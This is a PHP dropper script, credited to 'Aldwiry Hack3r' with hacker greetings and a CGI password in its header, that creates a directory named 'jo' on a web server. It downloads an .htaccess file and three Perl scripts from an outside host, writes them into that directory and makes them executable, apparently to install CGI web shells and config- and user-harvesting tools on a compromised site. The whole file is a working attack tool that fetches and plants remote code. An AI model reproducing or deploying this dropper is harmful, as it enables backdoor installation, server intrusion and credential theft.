<?
/*
 * Title : Perl Tools
 * Coder : Aldwiry Hack3r
 * IP    : 127.0.0.1 :P
 * Greet : Wesker Hackers And Ox Reda
 * CGI Password : jo
 * Must [CHMOD] Function Working !
 */

$dir = "jo";
@mkdir($dir);
if($dir){
    echo "<br> $dir Has Been Created !";
} else {
    echo "<br> [-] Error !";
}

    $htaccess = "http://members.multimania.co.uk/perltext/htaccess";
    $file = file_get_contents($htaccess);
    $open = fopen("jo/.htaccess" , 'w');
    fwrite($open,$file);
    fclose($open);
     if($open) {
         echo "<br> [htaccess] => Has Been Created !";
     } else {
         echo "<br>[-] Error !";
     }


    $cgi = "http://members.multimania.co.uk/perltext/cgi.txt";
    $file = file_get_contents($cgi);
    $open = fopen("jo/cgi.pl" , 'w');
    fwrite($open,$file);
    fclose($open);
     if($open) {
         echo "<br> [cgi] => Has Been Created !";
     } else {
         echo "<br>[-] Error !";
     }


    $cof = "http://members.multimania.co.uk/perltext/cof.txt";
    $file = file_get_contents($cof);
    $open = fopen("jo/cof.pl" , 'w');
    fwrite($open,$file);
    fclose($open);
     if($open) {
         echo "<br> [config] => Has Been Created !";
     } else {
         echo "<br>[-] Error !";
     }


    $usr = "http://members.multimania.co.uk/perltext/usr.txt";
    $file = file_get_contents($usr);
    $open = fopen("jo/usr.pl" , 'w');
    fwrite($open,$file);
    fclose($open);
     if($open) {
         echo "<br> [users] => Has Been Created !";
     } else {
         echo "<br>[-] Error !";
     }


    $cgip = "jo/cgi.pl";
        chmod($cgip, 0755);
        if($cgip){
            echo "<br>[CGI] => CHMOD To 755 Complate !";
        } else {
            echo "<br>[-] Error CHMOD !";
        }


    $cofp = "jo/cof.pl";
        chmod($cofp, 0755);
        if($cofp){
            echo "<br>[Config] => CHMOD To 755 Complate !";
        } else {
            echo "<br>[-] Error CHMOD !";
        }

    $usrp = "jo/usr.pl";
        chmod($usrp, 0755);
        if($usrp){
            echo "<br>[Users] => CHMOD To 755 Complate !";
        } else {
            echo "<br>[-] Error CHMOD !";
        }

?>